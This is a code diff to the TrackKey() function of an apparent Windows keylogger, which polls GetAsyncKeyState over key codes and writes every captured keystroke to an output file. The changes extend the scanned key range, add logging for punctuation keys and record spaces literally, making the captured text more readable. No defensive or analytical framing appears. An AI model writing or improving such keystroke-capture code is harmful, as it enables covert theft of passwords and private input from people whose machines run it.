@@ -161,7 +161,7 @@ void TrackKey()
  
     while(1)
     {
-        for(int key = 0; key < 127; key++)
+        for(unsigned char key = 0; key < 190; key++)
         {
             if(GetAsyncKeyState(key) == -32767)
             {
@@ -207,7 +207,7 @@ void TrackKey()
                        fout << "[Insert]"; break;
                 case VK_SPACE:
 //                    fprintf(OUTPUT_FILE, "%s", "[Space]"); break;
-                       fout << "[Space]"; break;
+                       fout << " "; break;
                 case VK_LEFT:
 //                    fprintf(OUTPUT_FILE, "%s", "[Left]"); break;
                        fout << "[Left]"; break;
@@ -220,15 +220,33 @@ void TrackKey()
                 case VK_DOWN:
 //                    fprintf(OUTPUT_FILE, "%s", "[Down]"); break;
                        fout << "[Down]"; break;
-                case 110:
+                case 110 :
 //                    fprintf(OUTPUT_FILE, "%s", "."); break;
-                       fout << "."; break;
+                       fout << ".";     break;
                 case 190:
 //                    fprintf(OUTPUT_FILE, "%s", "."); break;
-                       fout << "."; break;
+                       fout << ".";     break;
+                case 188:
+//                    fprintf(OUTPUT_FILE, "%s", "."); break;
+                       fout << ","; break;
+                case 161:
+//                    fprintf(OUTPUT_FILE, "%s", "."); break;
+                       fout << "\0"; break;
+                case 160:
+//                    fprintf(OUTPUT_FILE, "%s", "."); break;
+                       fout << "\0"; break;
+                case 186:
+//                    fprintf(OUTPUT_FILE, "%s", "."); break;
+                       fout << ";"; break;
+                case 189:
+//                    fprintf(OUTPUT_FILE, "%s", "."); break;
+                       fout << "-"; break;
+                case 187:
+//                    fprintf(OUTPUT_FILE, "%s", "."); break;
+                       fout << "="; break;
                     default:
 //                        fprintf(OUTPUT_FILE, "%s", &key); break;
-                       fout << (char)key; break;
+                       fout << key; break;
                 }
 
             }
